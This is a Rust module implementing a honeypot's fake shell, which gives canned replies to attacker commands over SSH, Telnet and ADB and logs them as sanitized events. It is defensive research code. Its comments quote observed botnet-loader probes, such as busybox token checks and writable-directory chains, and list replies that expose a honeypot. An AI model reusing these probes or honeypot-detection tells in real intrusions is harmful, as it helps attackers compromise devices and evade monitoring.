//! The fake interactive shell (Task 13) presented to an attacker after SSH authentication
//! succeeds. Originally part of `sensor-ssh`; moved here (Task 1 of the remaining-sensors plan)
//! so `sensor-telnet`/`sensor-adb` can reuse it without depending on sensor-ssh. See "Fake
//! shell", "Never-exec", and "No attacker-directed fetch" in
//! `internal/design/02-sensor-framework.md`: this module sits on the two highest-priority
//! security surfaces in the platform, and both governing invariants are enforced by
//! construction, not by care.
//!
//! **Never-exec.** No file in this crate's `src/`, nor in `sensor-ssh`'s, imports a
//! process-spawning facility: no `Command` type pulled in from `std`'s `process` module, no
//! `exec`-family call, no dynamic evaluation of any kind. Every command below returns a
//! hand-written, static or lightly-interpolated string; there is no code path from an
//! attacker-typed byte to a real shell, syscall, or interpreter. `never_exec_static_check` in
//! `sensor-ssh`'s `tests/shell_test.rs` asserts this at the source level (as plain substring
//! matches, so this doc comment is deliberately phrased to describe those APIs without spelling
//! out their exact paths) across every file in both crates' `src/`, not just this one.
//!
//! **No attacker-directed fetch.** `wget`/`curl` return a canned transcript and perform zero
//! network I/O. This is guaranteed the same way never-exec is: this crate (and the whole
//! workspace) depends on no HTTP or generic network-fetch client, so there is nothing present
//! capable of making the request even if a future change tried to. `tests/shell_test.rs`'s
//! `workspace_lockfile_has_no_http_client_crate` asserts the fully-resolved workspace lockfile
//! names none; Task 14's `no_outbound_connection` integration test verifies the same thing at
//! runtime, across a live session.
//!
//! Every attacker-controlled byte this module embeds in a `SensorEvent` clears
//! `sensor_framework::sanitize_value` first - the same chokepoint `auth.rs` and `channel.rs`
//! route through - so a command line can never forge a second wire record via an embedded CR/LF
//! or ANSI escape.

use std::net::IpAddr;

use sensor_wire::{
    PROTO_TCP, SIGNAL_HONEYPOT_COMMAND_EXEC, SIGNAL_HONEYPOT_FILE_DOWNLOAD, SensorEvent,
    WIRE_VERSION,
};

use crate::command_codec::CommandCodec;
use crate::fakefs::{FakeFs, FsError, READ_CAP};
use crate::persona;
use crate::sanitize_value;

/// Cap applied to the sanitized command line captured in `metadata.command`. Matches
/// `auth::MAX_METADATA_STRING_LEN`'s convention of a generous, fixed bound on an
/// attacker-controlled string entering an event.
const MAX_COMMAND_LEN: usize = 1024;

/// Cap applied to the `wget`/`curl` target URL echoed back in canned output. Smaller than
/// `MAX_COMMAND_LEN` since it is one token of the line, not the whole line.
const MAX_URL_LEN: usize = 512;

/// The per-session facts every `honeypot_command_exec` event carries, handed in once at shell
/// construction. Mirrors `auth::AuthState`'s "real parameters, no placeholder" convention:
/// `source_ip`/`wan_ip` are this connection's real attributes. `authenticated` is read from here
/// rather than hardcoded `true` - the shell is only ever reached post-authentication in practice,
/// but a future caller (a pre-auth probe, a non-interactive path) must not have its events
/// silently mis-tagged by a hardcoded value.
///
/// `protocol_label` exists because this shell is shared across protocols (SSH, Telnet, and per
/// the design spec eventually ADB): it names both the emitted event's top-level `sensor` field
/// and its `metadata.protocol_label` entry, so `handle_input` never hardcodes which sensor is
/// driving it. Every current and planned caller uses the same string for both - there is no
/// observed case where a `FakeShell` consumer's `sensor` name differs from its `protocol_label` -
/// so one field covers both rather than two that would only ever be set identically.
pub struct EmitContext {
    pub source_ip: IpAddr,
    pub wan_ip: Option<IpAddr>,
    pub authenticated: bool,
    pub protocol_label: String,
    pub session_id: Option<uuid::Uuid>,
}

/// Where a shell reads the time: the timestamps in its replies and the `observed_at` of its
/// events. Sessions use the system clock; a replay fixes it, so a transcript that prints the time
/// can be compared byte for byte.
pub type Clock = fn() -> chrono::DateTime<chrono::Utc>;

/// The two output streams a modeled command may write. Keeping the stream identity alongside
/// bytes lets a non-PTY SSH exec send stderr as extended data while a terminal can merge both in
/// their original order.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum OutputFd {
    Stdout,
    Stderr,
}

/// One ordered write made by a modeled command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct OutputSegment {
    pub fd: OutputFd,
    pub bytes: Vec<u8>,
}

/// One output redirection parsed from a simple command's whitespace tokens. S5 models fd 1
/// (stdout) and fd 2 (stderr) only; the full 0-9 open-file-description table is S8.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
struct Redirection<'a> {
    /// Source fd being redirected: 1 for `>`/`>>`, 2 for `2>`, etc.
    fd: u8,
    kind: RedirKind<'a>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum RedirKind<'a> {
    /// `> t`, `>> t`, `>t`, `2>t`: write (append=false truncates, true appends) to a path token.
    /// `/dev/null` is recognised at apply time and discards; it is NOT created as a file.
    File { target: &'a str, append: bool },
    /// `N>&M` / `>&M`: duplicate fd M's current destination onto fd N (`2>&1`, `1>&2`).
    Dup(u8),
    /// `N>&-`: close fd N (route to discard).
    Close,
}

/// A simple command's argv with its output redirections removed, produced by `split_redirections`.
struct Redirected<'a> {
    argv: Vec<&'a str>,
    redirs: Vec<Redirection<'a>>,
}

/// The observable result of one command or command list. Status is authoritative for shell
/// control flow; output wording is never inspected to decide whether `&&` or `||` continues.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CommandResult {
    pub status: u8,
    pub output: Vec<OutputSegment>,
    pub close_session: bool,
    combined: Vec<u8>,
    stop_line: bool,
}

impl CommandResult {
    fn silent(status: u8) -> Self {
        Self {
            status,
            output: Vec::new(),
            close_session: false,
            combined: Vec::new(),
            stop_line: false,
        }
    }

    fn stdout(bytes: impl Into<Vec<u8>>) -> Self {
        Self::one(OutputFd::Stdout, 0, bytes.into())
    }

    fn stderr(status: u8, bytes: impl Into<Vec<u8>>) -> Self {
        Self::one(OutputFd::Stderr, status, bytes.into())
    }

    fn one(fd: OutputFd, status: u8, bytes: Vec<u8>) -> Self {
        if bytes.is_empty() {
            return Self::silent(status);
        }
        Self {
            status,
            combined: bytes.clone(),
            output: vec![OutputSegment { fd, bytes }],
            close_session: false,
            stop_line: false,
        }
    }

    fn shell_exit(status: u8, bytes: impl Into<Vec<u8>>, close_session: bool) -> Self {
        let mut result = Self::one(OutputFd::Stdout, status, bytes.into());
        result.close_session = close_session;
        result.stop_line = true;
        result
    }

    fn append(&mut self, mut other: Self) {
        self.status = other.status;
        self.close_session |= other.close_session;
        self.stop_line |= other.stop_line;
        self.combined.append(&mut other.combined);
        self.output.append(&mut other.output);
    }

    pub fn bytes(&self) -> &[u8] {
        &self.combined
    }

    pub fn into_bytes(self) -> Vec<u8> {
        self.combined
    }

    pub fn is_empty(&self) -> bool {
        self.combined.is_empty()
    }

    pub fn contains(&self, needle: &str) -> bool {
        if needle.is_empty() {
            return true;
        }
        self.combined
            .windows(needle.len())
            .any(|window| window == needle.as_bytes())
    }

    pub fn starts_with(&self, prefix: &str) -> bool {
        self.combined.starts_with(prefix.as_bytes())
    }

    pub fn ends_with(&self, suffix: &str) -> bool {
        self.combined.ends_with(suffix.as_bytes())
    }

    pub fn lines(&self) -> std::str::Lines<'_> {
        std::str::from_utf8(&self.combined).unwrap_or("").lines()
    }
}

impl std::fmt::Display for CommandResult {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{}", String::from_utf8_lossy(&self.combined))
    }
}

impl PartialEq<&str> for CommandResult {
    fn eq(&self, other: &&str) -> bool {
        self.combined == other.as_bytes()
    }
}

impl PartialEq<String> for CommandResult {
    fn eq(&self, other: &String) -> bool {
        self.combined == other.as_bytes()
    }
}

/// Apply the terminal ONLCR output transformation without assuming UTF-8. Every LF becomes CR-LF;
/// all other bytes, including NUL and arbitrary executable bytes, pass through unchanged.
pub fn onlcr(bytes: &[u8]) -> Vec<u8> {
    let extra = bytes.iter().filter(|&&byte| byte == b'\n').count();
    let mut out = Vec::with_capacity(bytes.len().saturating_add(extra));
    for &byte in bytes {
        if byte == b'\n' {
            out.push(b'\r');
        }
        out.push(byte);
    }
    out
}

/// Per-session ceiling on `honeypot_command_exec` events. A real interactive attacker runs a
/// bounded kill chain (tens of commands); an unbounded stream is a flood - one IP produced >20k
/// command events by streaming binary over the channel. Past this, the shell keeps responding but
/// stops appending per-line events (one marker is emitted at the boundary), so a single session
/// cannot pollute the append-only ledger without bound.
const MAX_COMMANDS_PER_SESSION: u64 = 256;

/// The fake shell. One instance per interactive session or exec request; filesystem, working
/// directory, codec and nested shell levels persist across input lines.
pub struct FakeShell {
    fs: FakeFs,
    ctx: EmitContext,
    cwd: String,
    /// Per-session de-obfuscation for XOR-encoded command probes (see `command_codec`).
    codec: CommandCodec,
    /// Count of input lines this session (whether or not each produced an event); drives the flood
    /// cap.
    command_count: u64,
    /// Whether the one-per-session binary-flood marker has been emitted.
    binary_flagged: bool,
    /// Whether the one-per-session command-cap marker has been emitted.
    cap_flagged: bool,
    /// Which host persona this session presents. Active shell levels decide diagnostics and
    /// prompts; the flavor keeps `uname` aligned with the filesystem snapshot.
    flavor: ShellFlavor,
    context: ShellContext,
    levels: Vec<ShellLevel>,
    hostname: String,
    clock: Clock,
}

/// How the outermost shell was entered. Login shells read Ubuntu's interactive startup files;
/// one-shot exec commands do not; Android uses mksh rather than either GNU shell.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ShellContext {
    LoginInteractive,
    ExecC,
    AndroidMksh,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ShellLevel {
    Bash { login: bool },
    Dash { line: u64 },
    AndroidMksh,
}

/// The host persona a session presents. The command grammar is shared, but Linux and Android
/// report different kernels and use different outer shell identities. A session that mixed them
/// was the ADB tell: a Nexus 5 banner followed by an Ubuntu bash.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum ShellFlavor {
    /// Ubuntu's bash, on SSH and telnet.
    #[default]
    Bash,
    /// Android's mksh (`/system/bin/sh`), on ADB.
    AndroidSh,
}

impl FakeShell {
    pub fn new(fs: FakeFs, ctx: EmitContext) -> Self {
        Self::with_context(fs, ctx, ShellFlavor::Bash, ShellContext::LoginInteractive)
    }

    /// A non-interactive `bash -c`-style shell used by SSH exec requests.
    pub fn exec(fs: FakeFs, ctx: EmitContext) -> Self {
        Self::with_context(fs, ctx, ShellFlavor::Bash, ShellContext::ExecC)
    }

    /// The Android shell ADB serves: `FakeFs::android()` plus [`ShellFlavor::AndroidSh`], landing
    /// in `/` as an `adb shell` session does rather than a Linux server's `/root`.
    pub fn android(fs: FakeFs, ctx: EmitContext) -> Self {
        Self::with_context(fs, ctx, ShellFlavor::AndroidSh, ShellContext::AndroidMksh)
    }

    pub fn with_flavor(fs: FakeFs, ctx: EmitContext, flavor: ShellFlavor) -> Self {
        let context = match flavor {
            ShellFlavor::Bash => ShellContext::LoginInteractive,
            ShellFlavor::AndroidSh => ShellContext::AndroidMksh,
        };
        Self::with_context(fs, ctx, flavor, context)
    }

    fn with_context(
        fs: FakeFs,
        ctx: EmitContext,
        flavor: ShellFlavor,
        context: ShellContext,
    ) -> Self {
        let level = match context {
            ShellContext::LoginInteractive => ShellLevel::Bash { login: true },
            ShellContext::ExecC => ShellLevel::Bash { login: false },
            ShellContext::AndroidMksh => ShellLevel::AndroidMksh,
        };
        Self {
            fs,
            ctx,
            cwd: match flavor {
                ShellFlavor::Bash => "/root".to_string(),
                ShellFlavor::AndroidSh => "/".to_string(),
            },
            codec: CommandCodec::new(),
            command_count: 0,
            binary_flagged: false,
            cap_flagged: false,
            flavor,
            context,
            levels: vec![level],
            hostname: persona::hostname(),
            clock: chrono::Utc::now,
        }
    }

    /// The same shell reading its time from `clock` instead of the system clock.
    pub fn with_clock(mut self, clock: Clock) -> Self {
        self.clock = clock;
        self
    }

    /// The working directory, for the prompt a sensor prints between commands.
    pub fn cwd(&self) -> &str {
        &self.cwd
    }

    /// The prompt for the active shell level. Exec requests have no prompt.
    pub fn prompt(&self) -> String {
        match (self.context, self.active_level()) {
            (ShellContext::ExecC, _) => String::new(),
            (_, ShellLevel::Bash { .. }) => {
                let display = match self.cwd.strip_prefix("/root") {
                    Some("") => "~".to_string(),
                    Some(rest) if rest.starts_with('/') => format!("~{rest}"),
                    _ => self.cwd.clone(),
                };
                format!("root@{}:{display}# ", self.hostname)
            }
            (_, ShellLevel::Dash { .. }) => "# ".to_string(),
            (_, ShellLevel::AndroidMksh) => persona::android_root_prompt(&self.cwd),
        }
    }

    fn active_level(&self) -> ShellLevel {
        self.levels
            .last()
            .copied()
            .expect("a FakeShell always has an outermost level")
    }

    fn advance_shell_line(&mut self) {
        if let Some(ShellLevel::Dash { line }) = self.levels.last_mut() {
            *line = line.saturating_add(1);
        }
    }

    fn error_prefix(&self) -> String {
        match (self.context, self.active_level()) {
            (ShellContext::ExecC, ShellLevel::Bash { .. }) => "bash: line 1".to_string(),
            (_, ShellLevel::Bash { login: true }) => "-bash".to_string(),
            (_, ShellLevel::Bash { login: false }) => "bash".to_string(),
            (_, ShellLevel::Dash { line }) => format!("sh: {line}"),
            (_, ShellLevel::AndroidMksh) => "sh".to_string(),
        }
    }

    fn shell_error(&self, detail: impl std::fmt::Display) -> String {
        format!("{}: {detail}\n", self.error_prefix())
    }

    fn argv_zero(&self) -> &'static str {
        match self.active_level() {
            ShellLevel::Bash { login: true } => "-bash",
            ShellLevel::Bash { login: false } => "bash",
            ShellLevel::Dash { .. } | ShellLevel::AndroidMksh => "sh",
        }
    }

    fn is_bash(&self) -> bool {
        matches!(self.active_level(), ShellLevel::Bash { .. })
    }

    /// What the active shell says for a command it cannot find.
    fn not_found(&self, what: &str) -> String {
        match (self.context, self.active_level()) {
            (ShellContext::ExecC, ShellLevel::Bash { .. }) => {
                format!("bash: line 1: {what}: command not found\n")
            }
            (_, ShellLevel::Bash { .. }) => login_command_not_found(what)
                .map(str::to_string)
                .unwrap_or_else(|| format!("{what}: command not found\n")),
            (_, ShellLevel::Dash { line }) => format!("sh: {line}: {what}: not found\n"),
            (_, ShellLevel::AndroidMksh) => format!("sh: {what}: not found\n"),
        }
    }

    /// Encode outbound bytes with the session's locked obfuscation key (identity when the session is
    /// plaintext). The sensor calls this on its assembled response so a symmetric-codec bot reads
    /// plaintext after de-obfuscating.
    pub fn encode_output(&self, bytes: &[u8]) -> Vec<u8> {
        self.codec.encode(bytes)
    }

    /// Handle one line of shell input: capture it as a `honeypot_command_exec` event (unless the
    /// line is blank - see below), then return the canned terminal output for a recognized
    /// command, or a `command not found` message for anything else.
    ///
    /// A blank line (empty or whitespace-only) produces neither output nor an event. A bare
    /// keystroke or a terminal keepalive is not "a command" by any real shell's definition, and
    /// counting one would pad `honeypot_command_exec` telemetry with empty-command noise on
    /// every idle newline a client sends. This is the one place this function departs from
    /// "every call captures exactly one event" - called out here since it is the one behavior in
    /// this module not dictated directly by the interface.
    pub fn handle_input(&mut self, line: impl AsRef<[u8]>) -> (CommandResult, Vec<SensorEvent>) {
        let raw = String::from_utf8_lossy(line.as_ref());
        if raw.trim().is_empty() {
            return (CommandResult::silent(0), Vec::new());
        }
        self.advance_shell_line();

        // Decode a single-byte-XOR-obfuscated probe (identity for plaintext). The event records a
        // sanitized, lossily decoded representation of the pre-codec bytes; the transport capture,
        // when one is retained, is where exact wire bytes live. The decoded form and key are
        // annotated alongside so the grammar can respond and an analyst can read it. Dispatch and
        // URL capture run on the decoded line.
        let (decoded, key) = self.codec.decode(&raw);
        self.command_count += 1;

        // Two floods must never pollute the append-only ledger with one event per line: a
        // binary/non-text line (an SSH/telnet channel tunneling binary, or a fuzzer - not a
        // command), and an unbounded stream of commands from one session (a single IP produced
        // >20k `command_exec` events this way). In both cases we STILL dispatch below so the fake
        // shell keeps responding - a silently dead session is itself a tell - but emit at most ONE
        // marker event per session per flood kind rather than one event per garbage line.
        let events = if is_binary_line(&decoded) {
            if std::mem::replace(&mut self.binary_flagged, true) {
                Vec::new()
            } else {
                vec![self.command_event(serde_json::json!({
                    "protocol_label": self.ctx.protocol_label,
                    "command": "<binary channel data; per-line command events suppressed>",
                    "flood": "binary",
                }))]
            }
        } else if self.command_count > MAX_COMMANDS_PER_SESSION {
            if std::mem::replace(&mut self.cap_flagged, true) {
                Vec::new()
            } else {
                vec![self.command_event(serde_json::json!({
                    "protocol_label": self.ctx.protocol_label,
                    "command": format!(
                        "<per-session command cap of {MAX_COMMANDS_PER_SESSION} reached; further commands suppressed>"
                    ),
                    "flood": "command_cap",
                }))]
            }
        } else {
            // Normal command: the event records the sanitized pre-codec text; the decoded form and
            // XOR key are annotated alongside.
            let mut metadata = serde_json::json!({
                "protocol_label": self.ctx.protocol_label,
                "command": sanitize_value(&raw, MAX_COMMAND_LEN),
            });
            if let Some(k) = key
                && let Some(obj) = metadata.as_object_mut()
            {
                obj.insert(
                    "command_decoded".to_string(),
                    serde_json::json!(sanitize_value(&decoded, MAX_COMMAND_LEN)),
                );
                obj.insert("xor_key".to_string(), serde_json::json!(k));
            }
            let mut evs = vec![self.command_event(metadata)];
            for url in download_targets(&decoded) {
                let sanitized_url = sanitize_value(&url, MAX_URL_LEN);
                evs.push(SensorEvent {
                    v: WIRE_VERSION,
                    source_ip: self.ctx.source_ip,
                    wan_ip: self.ctx.wan_ip,
                    sensor: self.ctx.protocol_label.clone(),
                    signal_type: SIGNAL_HONEYPOT_FILE_DOWNLOAD.into(),
                    protocol: PROTO_TCP.into(),
                    authenticated: self.ctx.authenticated,
                    observed_at: (self.clock)(),
                    metadata: serde_json::json!({
                        "protocol_label": self.ctx.protocol_label,
                        "url": sanitized_url,
                    }),
                    sample: None,
                    session_id: self.ctx.session_id,
                    occurrence_id: None,
                });
            }
            evs
        };

        let output = self.run_line(&decoded);
        (output, events)
    }

    /// Run one decoded input line the way a shell reads it: each simple command in order, with
    /// `&&` and `||` short-circuiting on the previous command's outcome and `;`, `&` and a
    /// newline just sequencing. A pipeline stays one command answered by its first stage, and
    /// quotes are not parsed; this is a response grammar, not an interpreter. Dispatching the
    /// whole line as one command answered a loader's gate line `ls /home; /bin/busybox BOTNET`
    /// with "ls: cannot access '/home;'" and never ran the busybox probe, so the bot never got
    /// the "applet not found" reply it waits for and left before its download stage (observed
    /// live 2026-09-06).
    fn run_line(&mut self, decoded: &str) -> CommandResult {
        let mut result = CommandResult::silent(0);
        for (op, segment) in control_segments(decoded) {
            let run = match op {
                ControlOp::Seq => true,
                ControlOp::And => result.status == 0,
                ControlOp::Or => result.status != 0,
            };
            if !run {
                continue;
            }
            let all: Vec<&str> = segment.split_whitespace().collect();
            let stage = first_pipeline_stage(&all);
            if stage.is_empty() {
                continue;
            }
            let command = self.run_simple(stage);
            result.append(command);
            if result.stop_line {
                break;
            }
        }
        result
    }

    /// Run one simple command (the first pipeline stage of a control segment): parse its
    /// redirections, open the targets before dispatch (a real shell opens fds before exec),
    /// dispatch the command, then route each output segment to its fd's destination.
    ///
    /// A command made only of redirections (`> path`) is a real command: it opens the file for
    /// writing and prints nothing. Loaders probe for a writable directory this way, chaining
    /// `>/var/run/.x && cd /var/run` across a list of candidates, and the probe must succeed
    /// exactly where the box would let it (the directory exists) and fail with the shell's own
    /// message where it does not, or the `&&` after it runs in the wrong places. Dispatching
    /// `>/var/run/.x` as a command name answered "command not found", failed every probe, and the
    /// chain never reached the busybox marker the loader keys its next stage on (observed live
    /// 2026-09-06).
    fn run_simple(&mut self, stage: &[&str]) -> CommandResult {
        #[derive(Clone)]
        enum Sink {
            Terminal,
            Discard,
            File { path: String, append: bool },
        }

        let Redirected { argv, redirs } = split_redirections(stage);

        // Destination per fd; index 0 is unused, 1 is stdout, 2 is stderr.
        let mut sink = [Sink::Terminal, Sink::Terminal, Sink::Terminal];

        // The first failing file redirection prints the shell's own error and the command never
        // dispatches, as in bash.
        for r in &redirs {
            let idx = usize::from(r.fd);
            match r.kind {
                RedirKind::Close => {
                    if let Some(slot) = sink.get_mut(idx) {
                        *slot = Sink::Discard;
                    }
                }
                RedirKind::Dup(m) => {
                    let dest = sink.get(usize::from(m)).cloned().unwrap_or(Sink::Terminal);
                    if let Some(slot) = sink.get_mut(idx) {
                        *slot = dest;
                    }
                }
                RedirKind::File { target, append } => {
                    let resolved = self.resolve_logical(target);
                    if is_discard_path(&resolved) {
                        if let Some(slot) = sink.get_mut(idx) {
                            *slot = Sink::Discard;
                        }
                        continue;
                    }
                    // `>>` keeps an existing file's content; everything else creates or truncates.
                    let open = if append && self.fs.file_exists(&resolved) {
                        Ok(())
                    } else {
                        self.fs.create_file(&resolved)
                    };
                    if let Err(error) = open {
                        return self.redirect_open_error(&resolved, &error);
                    }
                    if let Some(slot) = sink.get_mut(idx) {
                        *slot = Sink::File {
                            path: resolved,
                            append,
                        };
                    }
                }
            }
        }

        // An empty argv (a redirection-only command) dispatches to a silent success.
        let result = self.dispatch(&argv);
        if redirs.is_empty() {
            return result;
        }

        let mut kept: Vec<OutputSegment> = Vec::new();
        let mut writes: Vec<(String, bool, Vec<u8>)> = Vec::new();
        for seg in &result.output {
            let idx = match seg.fd {
                OutputFd::Stdout => 1,
                OutputFd::Stderr => 2,
            };
            match sink.get(idx) {
                Some(Sink::Discard) => {}
                Some(Sink::File { path, append }) => {
                    match writes.iter_mut().find(|(p, _, _)| p == path) {
                        Some((_, _, buf)) => buf.extend_from_slice(&seg.bytes),
                        None => writes.push((path.clone(), *append, seg.bytes.clone())),
                    }
                }
                Some(Sink::Terminal) | None => kept.push(seg.clone()),
            }
        }

        // The target was truncated or preserved at open, so `>` and `>>` both continue from the
        // file's current content.
        for (path, append, bytes) in writes {
            let mut content = if append {
                self.fs.read_all(&path, READ_CAP).unwrap_or_default()
            } else {
                Vec::new()
            };
            content.extend_from_slice(&bytes);
            let _ = self.fs.write_file(&path, &content);
        }

        let mut terminal = CommandResult::silent(result.status);
        for seg in kept {
            terminal.append(CommandResult::one(seg.fd, result.status, seg.bytes));
        }
        terminal.close_session = result.close_session;
        terminal.stop_line = result.stop_line;
        terminal
    }

    /// What the shell itself says when it cannot open a redirection target.
    fn redirect_open_error(&self, resolved: &str, error: &FsError) -> CommandResult {
        let reason = match error {
            FsError::ReadOnly => "Read-only file system",
            FsError::IsADirectory => "Is a directory",
            FsError::NoSpace => "No space left on device",
            _ => "No such file or directory",
        };
        CommandResult::stderr(1, self.shell_error(format_args!("{resolved}: {reason}")))
    }

    /// Build a `honeypot_command_exec` event carrying `metadata`, stamped from the session context.
    /// Shared by the normal-command path and the two flood-marker paths.
    fn command_event(&self, metadata: serde_json::Value) -> SensorEvent {
        SensorEvent {
            v: WIRE_VERSION,
            source_ip: self.ctx.source_ip,
            wan_ip: self.ctx.wan_ip,
            sensor: self.ctx.protocol_label.clone(),
            signal_type: SIGNAL_HONEYPOT_COMMAND_EXEC.into(),
            protocol: PROTO_TCP.into(),
            authenticated: self.ctx.authenticated,
            observed_at: (self.clock)(),
            metadata,
            sample: None,
            session_id: self.ctx.session_id,
            occurrence_id: None,
        }
    }

    /// Produce the canned terminal output for one already-tokenized, non-empty command line.
    /// Every arm returns a static or lightly-interpolated string; none evaluates, spawns, or
    /// otherwise interprets `parts` as code - see the module doc.
    fn dispatch(&mut self, parts: &[&str]) -> CommandResult {
        // Match on the command's basename, so a full path (`/bin/busybox`, `/userfs/bin/wget`,
        // `/bin/sh`) - which IoT loaders routinely use - resolves to the same applet a bare invocation
        // would, the way a real shell finds it on PATH. Only the command token is normalised;
        // arguments are untouched.
        let cmd = parts.first().map(|p| command_basename(p));
        match cmd {
            Some("uname") => CommandResult::stdout(cmd_uname(parts, self.flavor)),
            Some("id") => CommandResult::stdout(
                "uid=0(root) gid=0(root) groups=0(root)\n"
                    .as_bytes()
                    .to_vec(),
            ),
            Some("whoami") => CommandResult::stdout(b"root\n".to_vec()),
            Some("pwd") => CommandResult::stdout(format!("{}\n", self.cwd)),
            Some("echo") if parts.get(1..) == Some(&["$0"][..]) => {
                CommandResult::stdout(format!("{}\n", self.argv_zero()))
            }
            Some("echo") => CommandResult::stdout(cmd_echo(&parts[1..])),
            Some("cat") => self.cmd_cat(parts),
            Some("ls") => self.cmd_ls(parts),
            // `mount` with no arguments lists the same table `/proc/mounts` exposes; mounting
            // something as root is a silent success like the other no-output applets.
            Some("mount") => CommandResult::stdout(cmd_mount(parts)),
            // Mirai's telnet preamble is `enable`, `system`, `shell`, `sh`: CLI-escape words for
            // routers. On the bash this box claims, `enable` is a builtin that lists the enabled
            // builtins; answering "command not found" for it (observed live 2026-09-06) was the
            // one reply a bash never gives. `system` and `shell` really are unknown to bash.
            Some("enable") if self.is_bash() => CommandResult::stdout(cmd_enable(parts)),
            Some("enable") => CommandResult::stderr(127, self.not_found("enable")),
            Some("true") | Some(":") => CommandResult::silent(0),
            Some("false") => CommandResult::silent(1),
            Some("wget") => {
                let writes_stdout = matches!(wget_output(parts), WgetOutput::Stdout);
                let out = cmd_wget(parts, (self.clock)());
                self.save_fetched_file("wget", parts);
                if writes_stdout {
                    CommandResult::stdout(out)
                } else {
                    CommandResult::one(OutputFd::Stderr, 0, out.into_bytes())
                }
            }
            Some("curl") => {
                let out = cmd_curl(parts);
                self.save_fetched_file("curl", parts);
                CommandResult::stdout(out)
            }
            Some("ping") => CommandResult::stdout(cmd_ping(parts)),
            // Shell-availability fingerprint: every real system has /bin/sh, so "command not found"
            // for sh/bash instantly outs the honeypot and the dropper leaves. Model a nested shell.
            // `ash` is BusyBox's shell and appears in the applet list, so it resolves here too.
            Some("sh") | Some("bash") | Some("ash") => self.cmd_shell_spawn(parts),
            // The canonical Mirai/Gafgyt probe is `/bin/busybox <TOKEN>`, which they confirm by the
            // exact "<TOKEN>: applet not found" reply; they also fetch payloads via `busybox wget`
            // and `busybox tftp`.
            Some("busybox") => self.cmd_busybox(parts),
            // tftp/ftpget are BusyBox download applets these loaders use; stay quiet (a real
            // non-interactive fetch prints nothing on success) rather than "command not found". The
            // target URL is captured by `download_target` above.
            Some(fetcher @ ("tftp" | "ftpget")) => {
                self.save_fetched_file(fetcher, parts);
                CommandResult::silent(0)
            }
            // Filesystem/no-output applets in a loader's drop chain (`chmod +x x`, then `cp`/`rm`/
            // `mkdir`/`sleep`). A real shell prints nothing on success, and "command not found" for
            // `chmod` is impossible on any real Linux - it outs the honeypot before the loader ever
            // executes its payload, costing the capture - so model them as silent successes.
            Some("chmod") => {
                // Silent like the real thing, but an executable mode on a file the attacker
                // created is remembered so that running it afterwards succeeds.
                let mut args = parts[1..].iter().filter(|a| !a.starts_with('-'));
                if let Some(mode) = args.next()
                    && mode_grants_execute(mode)
                {
                    for target in args {
                        let path = self.resolve_logical(target);
                        self.fs.mark_executable(&path);
                    }
                }
                CommandResult::silent(0)
            }
            // These change the filesystem the rest of the session sees. Answering silent
            // success while changing nothing let a loader `cp` a payload and then fail to find
            // it, and left a file it had just `rm`ed still readable.
            Some("cp") => self.cmd_cp(parts),
            Some("rm") => self.cmd_rm(parts),
            Some("mkdir") => self.cmd_mkdir(parts),
            Some("sleep") => CommandResult::silent(0),
            Some("cd") => {
                // Only into a directory the box presents: a silent `cd` into a directory that
                // `ls /` never showed is a tell, and a loader's `>/x/.x && cd /x` chain relies on
                // the two agreeing about what exists.
                let target =
                    self.resolve_logical(first_non_flag_arg(&parts[1..]).unwrap_or("/root"));
                if self.fs.is_dir(&target) {
                    self.cwd = target;
                    CommandResult::silent(0)
                } else {
                    CommandResult::stderr(
                        1,
                        self.shell_error(format_args!("cd: {target}: No such file or directory")),
                    )
                }
            }
            // Already root on this box, so `su` (and `su -`, `su root`) opens another bash
            // silently. It is still a real nested level: one `exit` returns to the caller.
            Some("su") => {
                let level = match self.active_level() {
                    ShellLevel::AndroidMksh => ShellLevel::AndroidMksh,
                    _ => ShellLevel::Bash { login: false },
                };
                self.push_level(level);
                CommandResult::silent(0)
            }
            Some("exit") => self.exit_shell(),
            Some("logout") => self.logout_shell(),
            // A token with a slash names a path, and bash answers for the path, not for PATH:
            // a file the attacker created and chmod'ed runs (an empty file exits 0 with no
            // output, which is what the writable-directory probe `>/tmp/d && chmod 777 /tmp/d
            // && /tmp/d && cd /tmp/` keys its `cd` on), one it did not chmod is refused, and a
            // path that does not exist is "No such file", never "command not found".
            Some(other) if parts[0].contains('/') => {
                let path = self.resolve_logical(parts[0]);
                if self.fs.is_executable(&path) {
                    CommandResult::silent(0)
                } else if self.fs.file_exists(&path) {
                    CommandResult::stderr(
                        126,
                        self.shell_error(format_args!("{}: Permission denied", parts[0])),
                    )
                } else if self.fs.is_dir(&path) {
                    CommandResult::stderr(
                        126,
                        self.shell_error(format_args!("{}: Is a directory", parts[0])),
                    )
                } else {
                    let _ = other;
                    // mksh says only "not found" for a path it cannot execute.
                    CommandResult::stderr(
                        127,
                        match self.active_level() {
                            ShellLevel::AndroidMksh => self.not_found(parts[0]),
                            _ => self.shell_error(format_args!(
                                "{}: No such file or directory",
                                parts[0]
                            )),
                        },
                    )
                }
            }
            // An interactive bash on Ubuntu prefixes the message with its own name; the bare form
            // matched no real shell.
            Some(other) => CommandResult::stderr(127, self.not_found(other)),
            None => CommandResult::silent(0),
        }
    }

    /// Resolve `arg` to an absolute logical path: joined onto `cwd` unless it starts with `/`, then
    /// normalised lexically. Symlinks stay unresolved here, so `cd /var/run` leaves `pwd` at
    /// `/var/run` as bash's logical mode does; [`FakeFs`] resolves them physically per operation.
    fn resolve_logical(&self, arg: &str) -> String {
        let joined = if arg.starts_with('/') {
            arg.to_string()
        } else {
            format!("{}/{arg}", self.cwd.trim_end_matches('/'))
        };
        // Normalise the way a kernel resolves a path: `.` and an empty segment (a trailing or
        // doubled slash) drop out, `..` climbs. Without this `./payload` - the form every
        // loader runs its dropped file with - resolved to a path the model never held.
        let mut segments: Vec<&str> = Vec::new();
        for segment in joined.split('/') {
            match segment {
                "" | "." => {}
                ".." => {
                    segments.pop();
                }
                name => segments.push(name),
            }
        }
        if segments.is_empty() {
            "/".to_string()
        } else {
            format!("/{}", segments.join("/"))
        }
    }

